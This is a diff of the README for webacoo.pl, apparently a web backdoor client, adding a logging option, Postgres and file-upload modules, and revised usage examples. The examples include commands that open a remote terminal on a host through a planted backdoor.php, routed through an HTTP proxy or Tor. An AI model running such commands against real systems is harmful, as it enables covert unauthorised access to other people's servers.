@@ -26,7 +26,7 @@ Requirements
 * liburi-perl
 * libio-socket-socks-perl
 
-If you do not want to install "libio-socket-socks-perl" for Tor proxy feature, comment line 9 at webacoo.pl
+If you do not want to install "libio-socket-socks-perl" for Tor proxy feature, comment line 25 at webacoo.pl
 
 Usage
 =====
@@ -65,6 +65,8 @@ Options:
 		1: print HTTP headers
 		2: print HTTP headers + data
 
+  -l LOG	Log activity to file
+
   -h		Display help and exit
 
   update	Check for updates and apply if any
@@ -81,6 +83,8 @@ terminal mode.
 
 Available extension modules:
 o mysql-cli	MySQL command line module
+o psql-cli	Postgres command line module
+o upload	File upload module using HTTP Post
 
 
 Examples
@@ -104,5 +108,5 @@ Examples
 6. Establish "terminal" connection with remote host through http proxy with basic auth
 ./webacoo.pl -t -u http://10.0.1.13/backdoor.php -p user:password:10.0.1.8:3128
 
-7. Establish "terminal" connection with remote host over Tor
-./webacoo.pl -t -u http://example.com/backdoor.php -p tor
+7. Establish "terminal" connection with remote host over Tor and log activity
+./webacoo.pl -t -u http://example.com/backdoor.php -p tor -l webacoo_log.txt
